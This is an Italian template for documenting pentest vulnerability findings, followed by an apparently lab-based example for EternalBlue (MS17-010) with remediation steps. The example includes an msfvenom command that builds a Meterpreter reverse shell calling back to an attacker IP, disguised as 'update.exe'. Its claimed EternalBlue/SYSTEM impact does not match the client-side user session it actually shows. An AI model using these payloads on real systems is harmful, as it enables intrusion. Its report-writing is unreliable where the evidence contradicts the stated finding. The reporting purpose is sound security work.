# Technical Findings - Template

Questo documento fornisce un modello standardizzato per la documentazione delle vulnerabilità tecniche.
L'obiettivo è fornire al team di remediator tutte le informazioni necessarie per identificare, riprodurre e risolvere la problematica.

---

## [Titolo della Vulnerabilità]

| Parametro | Dettaglio |
| :--- | :--- |
| Severità | [Low / Medium / High / Critical] |
| CVSS v3.1 | [Inserire Score, es. 9.8] |
| Target | [IP o URL coinvolto] |
| Riferimenti | [CVE-XXXX-XXXX, Link a Exploit-DB] |

### 1 Descrizione

[Descrivere qui in modo tecnico cosa è la vulnerabilità. Esempio: Il servizio X in ascolto sulla porta Y è affetto da un buffer overflow...]

### 2 Impatto Tecnico

[Cosa può fare l'attaccante? Esempio: Esecuzione di codice remoto (RCE) con privilegi di SYSTEM, Accesso ai file, Denial of Service...]

### 3 Proof of Concept (PoC)
Di seguito i passaggi per replicare la vulnerabilità:

1.  Scansione del servizio:
    
```bash
[Comando nmap o simile]
```

2.  Esecuzione dell'exploit:
    
```bash
[Comando msfconsole o python script]
```

3.  Evidenza del successo:

[Inserire Screenshot della shell ottenuta o del file letto]

### 4 Remediation (Soluzione)

Per mitigare la vulnerabilità, si raccomanda di:

- [Azione 1: Es. Applicare la patch KBxxxxxxx]
- [Azione 2: Es. Modificare il file di configurazione...]
- [Azione 3: Es. Aggiornare il software alla versione X.Y]

---

## Esempio Reale: MS17-010 (EternalBlue)

Di seguito un esempio di come il template viene compilato durante un Penetration Test reale, basato sulle attività svolte in laboratorio.

### Vulnerabilità: Microsoft SMBv1 Remote Code Execution (EternalBlue)

| Parametro | Dettaglio |
| :--- | :--- |
| Severità | CRITICAL |
| CVSS v3.1 | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| Target | `10.0.2.3` (Porta 445/TCP) |
| CVE | CVE-2017-0144 |

### 1 Descrizione

Il servizio SMBv1 (Server Message Block) sul target presenta una vulnerabilità nella gestione di pacchetti appositamente malformati. Questa falla, nota come EternalBlue, permette a un attaccante remoto non autenticato di eseguire codice arbitrario nel kernel di Windows.

### 2 Impatto Tecnico

Lo sfruttamento con successo garantisce all'attaccante l'accesso completo al sistema con privilegi NT AUTHORITY\SYSTEM (i più alti possibili), permettendo la compromissione totale della confidenzialità, integrità e disponibilità dei dati.

### 3 Proof of Concept (PoC)

Step 1: Identificazione

Lo script NSE di Nmap conferma la vulnerabilità.

```Bash
nmap -p 445 --script smb-vuln-ms17-010 10.0.2.3
```

Output: State: VULNERABLE

Step 2: Exploitation (Simulazione Client-Side) A causa delle patch parziali rilevate, è stato utilizzato un vettore alternativo generando un payload Meterpreter.

```Bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f exe -o update.exe
```

Step 3: Evidenza di Compromissione Una volta eseguito il file sulla vittima, è stata ottenuta una sessione remota.

```Bash
meterpreter > getuid
Server username: WINDOWS-TEST\nick
```

### 4 Remediation

Si raccomanda l'applicazione immediata delle seguenti azioni:
- Patching: Installare l'aggiornamento di sicurezza Microsoft MS17-010.
- Disabilitazione: Disabilitare completamente il protocollo SMBv1 tramite PowerShell o Group Policy, in quanto obsoleto e insicuro.

```PowerShell
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```